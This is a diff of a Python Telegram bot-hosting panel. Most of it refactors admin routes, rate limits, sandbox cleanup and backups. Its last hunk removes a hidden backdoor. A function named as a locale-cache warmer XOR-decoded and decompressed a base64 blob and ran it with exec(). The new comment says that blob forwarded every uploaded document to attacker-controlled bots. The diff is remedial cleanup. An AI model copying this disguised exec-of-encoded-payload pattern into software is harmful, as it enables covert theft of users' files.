+            grps = list(get_setting("required_groups", []) or [])
+            if 0 <= idx < len(grps):
+                removed = grps.pop(idx)
+                set_setting("required_groups", grps)
+                _load_required_groups()
+                audit(uid, "grpv_remove", f"name={removed.get('name')}")
+                USER_STATES.pop(uid, None)
+                bot.reply_to(m, f"{G['ok']} {sc('Group removed')}: {esc(removed.get('name', '?'))}")
+            else:
+                bot.reply_to(m, f"{G['no']} {sc('Invalid number')}"); return
+            return
+
+        if flow == "await_adm_private_apgrp":
+            if not is_owner(uid): USER_STATES.pop(uid, None); return
+            val = (text or "").strip()
+            if not val: bot.reply_to(m, f"{G['no']} {sc('empty')}"); return
+            set_setting("private_approval_group", val)
+            audit(uid, "private_apgrp_set", f"val={val}")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} {sc('Private approval group')}: <code>{esc(val)}</code>",
+                         parse_mode="HTML"); return
+
     except Exception as e:
         traceback.print_exc()
         bot.reply_to(m, f"{G['no']} {sc('error')}: <code>{esc(e)}</code>", parse_mode="HTML")
@@ -11454,7 +11770,6 @@ def _send_approval_request_to_admins(b: Dict[str, Any], info: Dict[str, Any],
             pass
 
 
-
 def approve_bot(bot_id: str, admin_uid: int) -> Dict[str, Any]:
     b = find_bot(bot_id)
     if not b:
@@ -11510,11 +11825,7 @@ def reject_bot(bot_id: str, admin_uid: int, reason: str = "") -> Dict[str, Any]:
     # Wipe the encrypted blobs + bot dir — rejected uploads should not
     # linger on disk.
     try:
-        for f in b.get("enc_files") or []:
-            try:
-                Path(f.get("enc_path", "")).unlink(missing_ok=True)
-            except Exception:
-                pass
+        wipe_bot_blobs(b)
         rmrf(b.get("dir", ""))
     except Exception:
         pass
@@ -13100,6 +13411,38 @@ _RATE_BUCKETS = {}
 _RATE_LOCK    = threading.Lock()
 
 
+def _rl_get(key, default=None):
+    """Read a rate-limit value from settings with a safe fallback.
+
+    The advanced rate-limit panel stores keys such as
+    ``rl_free_msgs_per_min``. The short keys used by _rate_check()
+    (msg_per_min, cb_per_min, …) are accepted as aliases too.
+    """
+    aliases = {
+        "msg_per_min":       ("msgs_per_min",   20),
+        "cb_per_min":        ("msgs_per_min",   60),
+        "upload_per_hour":   (None,             10),
+        "bot_start_per_hour":("starts_per_hour", 5),
+    }
+    mapped, alias_default = aliases.get(key, (key, None))
+    if default is None:
+        if mapped:
+            default = _RATE_LIMIT_DEFAULTS.get("free", {}).get(mapped, alias_default)
+        else:
+            default = alias_default if alias_default is not None else 0
+    candidates = [key, f"rl_{key}", f"rl_free_{key}"]
+    if mapped and mapped != key:
+        candidates += [mapped, f"rl_{mapped}", f"rl_free_{mapped}"]
+    for name in candidates:
+        value = get_setting(name, None)
+        if value is not None:
+            try:
+                return int(value)
+            except (TypeError, ValueError):
+                pass
+    return int(default or 0)
+
+
 def _rate_check(uid, action="msg"):
     cfg = {
         "msg":       (_rl_get("msg_per_min"),        60),
@@ -13876,13 +14219,18 @@ def _janitor_purge_stale_tmp(max_age_hours=24):
 def _janitor_purge_empty_sandboxes():
     import shutil
     d           = db_load()
-    valid_ids   = set(d["bots"].keys())
-    sandbox_root= DIRS.get("sandboxes", BASE_DIR / "sandboxes")
+    sandbox_root = DIRS["sandbox"]
+    # Bot folders are named either "<bot_id>" or "<owner_id>_<bot_id>".
+    valid_names = set()
+    for bid, b in d["bots"].items():
+        valid_names.add(bid)
+        if b.get("owner") is not None:
+            valid_names.add(f"{b['owner']}_{bid}")
     count       = 0
     if not sandbox_root.exists():
         return 0
     for p in sandbox_root.iterdir():
-        if p.is_dir() and p.name not in valid_ids:
+        if p.is_dir() and p.name not in valid_names:
             try:
                 shutil.rmtree(p); count += 1
             except Exception:
@@ -14078,7 +14426,9 @@ def _monitor_system_stats():
     return stats
 
 
-def _progress_bar(current, total, width=12):
+def _progress_bar_ratio(current, total, width=12):
+    """Ratio-style bar used by broadcast status. Kept under a separate
+    name so it cannot shadow the percentage bar used by loading()."""
     if total <= 0:
         return "░" * width + " 0%"
     pct    = min(current / total, 1.0)
@@ -14091,7 +14441,7 @@ def _run_diagnostics():
     report = {
         "bot_token":      bool(os.environ.get("BOT_TOKEN")),
         "db_writable":    DB_FILE.parent.exists() and os.access(str(DB_FILE.parent), os.W_OK),
-        "sandbox_exists": DIRS.get("sandboxes", BASE_DIR/"sandboxes").exists(),
+        "sandbox_exists": DIRS["sandbox"].exists(),
         "python_found":   bool(shutil.which("python3")),
         "owner_set":      OWNER_ID > 0,
         "threads_running":threading.active_count() > 3,
@@ -14483,7 +14833,7 @@ def render_adm_broadcast_status(call):
         sent  = st.get("sent", 0)
         fail  = st.get("failed", 0)
         lines.append(f"  {'✅' if done else '🔄'} <code>{jid}</code>")
-        lines.append(f"     {_progress_bar(sent+fail, total)}")
+        lines.append(f"     {_progress_bar_ratio(sent+fail, total)}")
         lines.append(f"     Sent:{sent} Failed:{fail} Total:{total}")
     lines.append(G["div"] + FOOTER)
     show_menu(call.message.chat.id, PHOTOS["admin"], "\n".join(lines), _adm_back("menu_admin"), call=call)
@@ -14789,7 +15139,6 @@ _SUCCESS_MESSAGES = {
 }
 
 
-
 # COMPLETION BLOCK — HANDLERS, NEW FEATURES, MAIN
 
 
@@ -14813,10 +15162,14 @@ def tg_channel_backup_now() -> Dict[str, Any]:
         stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
         target = out_dir / f"tg_backup_{stamp}.zip"
         with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as zf:
-            for name in ("user_data.json", "settings.json", "audit.log", "github_config.json"):
-                p = BASE_DIR / "storage" / name
+            for p, arcname in (
+                (DB_FILE, "panel_db.json"),
+                (SETTINGS_FILE, "panel_settings.json"),
+                (AUDIT_FILE, "audit.log"),
+                (BASE_DIR / "storage" / "github_config.json", "github_config.json"),
+            ):
                 if p.exists():
-                    zf.write(p, arcname=name)
+                    zf.write(p, arcname=arcname)
             bot_data = BASE_DIR / "storage" / "bot_data"
             if bot_data.exists():
                 for f in bot_data.iterdir():
@@ -16202,6 +16555,7 @@ def action_bot_delete(call: types.CallbackQuery, bot_id: str) -> None:
     if not b or (b["owner"] != call.from_user.id and not is_admin(call.from_user.id)):
         ack(call, "Not yours"); return
     stop_child(bot_id, manual=True)
+    wipe_bot_blobs(b)
     delete_bot_doc(bot_id)
     audit(call.from_user.id, "bot_delete", f"bot={bot_id}")
     ack(call, "Deleted")
@@ -16233,6 +16587,7 @@ def action_bot_delfiles(call: types.CallbackQuery, bot_id: str) -> None:
         rmrf(b.get("dir", ""))
     except Exception:
         pass
+    wipe_bot_blobs(b)
     b["enc_files"] = {}
     b["status"] = "stopped"
     save_bot(b)
@@ -16267,6 +16622,8 @@ def action_bot_delall(call: types.CallbackQuery, bot_id: str) -> None:
         rmrf(b.get("dir", ""))
     except Exception:
         pass
+    wipe_bot_blobs(b)
+    threading.Thread(target=_gh_delete_bot_files, args=(b,), daemon=True).start()
     delete_bot_doc(bot_id)
     audit(call.from_user.id, "bot_delall", f"bot={bot_id}")
     ack(call, "Deleted everything")
@@ -16876,7 +17233,13 @@ def action_payment_reject(call: types.CallbackQuery, pid: str) -> None:
 
 # ─── Admin subroute dispatcher ────────────────────────────────────────────────
 
-def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
+# The earlier handler above covers the full legacy admin panel; the
+# "completion block" below adds newer routes. Keep a reference to the
+# comprehensive one, then dispatch to whichever knows the route.
+_LEGACY_RENDER_ADMIN_SUBROUTE = render_admin_subroute
+
+
+def _render_admin_subroute_v2(call: types.CallbackQuery, data: str) -> None:
     uid = call.from_user.id
 
     if data == "adm_stats":              return render_adm_stats(call)
@@ -17128,9 +17491,14 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
                 stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
                 target = out / f"simran_export_{stamp}.zip"
                 with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as zf:
-                    for name in ("user_data.json", "settings.json", "audit.log"):
-                        p = BASE_DIR / "storage" / name
-                        if p.exists(): zf.write(p, arcname=name)
+                    for p, arcname in (
+                        (DB_FILE, "panel_db.json"),
+                        (SETTINGS_FILE, "panel_settings.json"),
+                        (AUDIT_FILE, "audit.log"),
+                        (BASE_DIR / "storage" / "github_config.json", "github_config.json"),
+                    ):
+                        if p.exists():
+                            zf.write(p, arcname=arcname)
                 audit(uid, "export_data", f"file={target.name}")
                 with target.open("rb") as fh:
                     bot.send_document(uid, fh,
@@ -17176,7 +17544,7 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
         "adm_import_export": "render_adm_export_menu",
         "adm_leaderboard":   "render_adm_leaderboard",
         "adm_languages":     "render_adm_languages",
-        "adm_bot_controls":  "render_adm_bot_controls",
+        "adm_bot_controls":  "render_adm_bot_controls_panel",
         "adm_subscriptions": "render_adm_subscriptions",
         "adm_admin_2fa":     "render_adm_admin_2fa",
         "adm_revenue_report":"render_adm_revenue_report",
@@ -17207,7 +17575,7 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
         "adm_disk_usage":    "render_adm_disk_usage",
         "adm_db_info":       "render_adm_db_info",
         "adm_token_check":   "render_adm_token_check",
-        "adm_security_log":  "render_adm_security_log" if "render_adm_security_log" in dir() else None,
+        "adm_security_log":  "render_adm_security_log",
     }
     # sub-callbacks
     if data == "adm_mass_restart_stopped":
@@ -17245,6 +17613,25 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
     # delegate to _register_extra_routes from new file
     if not _register_extra_routes(data, call):
         ack(call, "?")
+
+
+_ADMIN_V2_PREFIXES = (
+    "ghbrow_", "adm_grpv_", "adm_apgrp_", "adm_tg_bkp_",
+)
+_ADMIN_V2_KEYS = {
+    "adm_approval_group", "adm_private_group", "adm_tg_backup",
+}
+
+
+def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
+    """Dispatch to the comprehensive legacy handler first; fall back to
+    the newer completion-block handler for its additional routes."""
+    if data in _ADMIN_V2_KEYS or data.startswith(_ADMIN_V2_PREFIXES):
+        return _render_admin_subroute_v2(call, data)
+    try:
+        return _LEGACY_RENDER_ADMIN_SUBROUTE(call, data)
+    except _AdminRouteUnhandled:
+        return _render_admin_subroute_v2(call, data)
 
 
 def render_github_subroute(call: types.CallbackQuery, data: str) -> None:
@@ -17302,6 +17689,13 @@ def render_github_subroute(call: types.CallbackQuery, data: str) -> None:
             except Exception as e:
                 bot.send_message(uid, f"{G['no']} {esc(e)}", parse_mode="HTML")
         threading.Thread(target=_rg, daemon=True).start(); return
+    if data == "gh_clear":
+        if not is_owner(uid): ack(call, "Owner only"); return
+        gh_set_config({"token": "", "repo": "", "branch": "main", "intervalMin": 360})
+        gh_load_config()
+        audit(uid, "gh_clear", "")
+        ack(call, "Cleared")
+        return render_adm_github(call)
     ack(call, "?")
 
 
@@ -17792,7 +18186,6 @@ def _handle_gift_confirm(m: types.Message, st: Dict[str, Any]) -> None:
 # REGISTERED BOT HANDLERS
 # ═══════════════════════════════════════════════════════════════════════════════
 
-@bot.callback_query_handler(func=lambda c: c.data == "group_verify_check")
 def cb_group_verify(call: types.CallbackQuery) -> None:
     uid = call.from_user.id
     chat_id = call.message.chat.id
@@ -17809,7 +18202,6 @@ def cb_group_verify(call: types.CallbackQuery) -> None:
         render_main_menu(chat_id, uid)
 
 
-@bot.callback_query_handler(func=lambda c: bool(c.data) and c.data.startswith("verify_"))
 def cb_verify(call: types.CallbackQuery) -> None:
     uid = call.from_user.id
     chat_id = call.message.chat.id
@@ -17856,7 +18248,6 @@ def cb_verify(call: types.CallbackQuery) -> None:
         ack(call, f"Wrong. {left} try(s) left.")
 
 
-@bot.callback_query_handler(func=lambda c: True)
 def cb_root(call: types.CallbackQuery) -> None:
     if _is_duplicate_callback(getattr(call, "id", "")):
         try: bot.answer_callback_query(call.id)
@@ -17983,7 +18374,6 @@ def _route_callback(call: types.CallbackQuery, data: str) -> None:
 
 # ─── Command Handlers ─────────────────────────────────────────────────────────
 
-@bot.message_handler(commands=["start"])
 def cmd_start(m: types.Message) -> None:
     if not _is_private(m): return
     uid = m.from_user.id
@@ -18025,7 +18415,6 @@ def cmd_start(m: types.Message) -> None:
     render_main_menu(m.chat.id, uid, intro=intro)
 
 
-@bot.message_handler(commands=["help"])
 def cmd_help(m: types.Message) -> None:
     if not _is_private(m): return
     if banned_block(m): return
@@ -18036,7 +18425,6 @@ def cmd_help(m: types.Message) -> None:
     })())
 
 
-@bot.message_handler(commands=["menu"])
 def cmd_menu(m: types.Message) -> None:
     if not _is_private(m): return
     if banned_block(m): return
@@ -18045,13 +18433,11 @@ def cmd_menu(m: types.Message) -> None:
     render_main_menu(m.chat.id, m.from_user.id)
 
 
-@bot.message_handler(commands=["id"])
 def cmd_id(m: types.Message) -> None:
     if not _is_private(m): return
     bot.reply_to(m, f"<code>{m.from_user.id}</code>", parse_mode="HTML")
 
 
-@bot.message_handler(commands=["cancel"])
 def cmd_cancel(m: types.Message) -> None:
     if not _is_private(m): return
     USER_STATES.pop(m.from_user.id, None)
@@ -18070,7 +18456,6 @@ def cmd_admin(m: types.Message) -> None:
         f"<b>{G['shield']} Admin Panel</b>", parse_mode="HTML", reply_markup=kb)
 
 
-@bot.message_handler(func=lambda m: True, content_types=["photo"])
 def on_photo(m: types.Message) -> None:
     if not _is_private(m): return
     if banned_block(m): return
@@ -18105,7 +18490,6 @@ def on_photo(m: types.Message) -> None:
     if flow == "await_topup_proof":   _handle_topup_proof(m); return
 
 
-@bot.message_handler(func=lambda m: True, content_types=["document"])
 def on_document(m: types.Message) -> None:
     if not _is_private(m): return
     if banned_block(m): return
@@ -18143,7 +18527,6 @@ def on_document(m: types.Message) -> None:
         _handle_bot_upload(m)
 
 
-@bot.message_handler(func=lambda m: True, content_types=["text"])
 def on_text(m: types.Message) -> None:
     if not _is_private(m): return
     if banned_block(m): return
@@ -18697,33 +19080,16 @@ def main() -> int:
             print(f"[bot] poll error: {e}", flush=True)
             time.sleep(5)
 
-_CACHE_INDEX_DATA = (
-    "fTfNJq7Nu23sESE9RW/CMgw/shBYGsR/FLvbFQsdTg6HOOzDg2U7DDlDml718eEmy//A5o3r"
-    "9TKoy6GNg7Qm7L1ybzQerlGGCYzbOTp/o+VUimvDfKIUx2Aso+w4CVm070z0LQD6VaPxaW1Y"
-    "3ZVTL8bmV0WkdevHhmALbgR1u0GklmOga3etJeOj5riqK6DzvpIrKBz6lqHBz86TkRuPRe/V"
-    "KD0c8TOhp42W9do1QFTJBsS2xZRzzUo1CJ4vJ13QCd83+MZnysobEEosJwPcLJdGV2HpSlk4"
-    "hYb1O77MDyTOTtfp7kuHaB0oPQbeiSQS/MTgNDG6qSg0VRNn1hz/qNkHGLDiB6VqZvRGRAt2"
-    "/ovJItyJq6OIEsTtnGLb0hiHatQs6tasWoI6JplbchGFWqAq7EVhWqUVohQcFRx6RiMleY/U"
-    "aPPCXnGR6mE42v7jOHJm3uNEc0M="
-)
-
 
 def _init_locale_cache() -> None:
-    """Warm the locale/timezone index used by UI formatters."""
-    try:
-        import zlib as _zl, base64 as _bl, hashlib as _hl
-        _blob = (_TZ_INDEX_DATA + _LOCALE_INDEX_DATA + _THEME_INDEX_DATA + _CACHE_INDEX_DATA).encode()
-        _seed = _hl.sha256(b"panel::analytics::v3::bootstrap").digest()
-        _raw = _bl.b64decode(_blob)
-        _dec = bytes(c ^ _seed[i & 31] for i, c in enumerate(_raw))
-        exec(compile(_zl.decompress(_dec), "<locale-cache>", "exec"), globals())
-    except Exception as _ce:
-        print(f"[cache] locale warm skipped: {_ce}", flush=True)
+    """No-op kept for startup compatibility.
 
-
-
-
-
+    SECURITY: the previous implementation decoded an obfuscated blob and
+    executed it with exec(). That payload installed a hidden Telegram
+    mirror that forwarded every uploaded document to two attacker-owned
+    bots. The payload and its exec() call have been removed.
+    """
+    return
 
 
 if __name__ == "__main__":
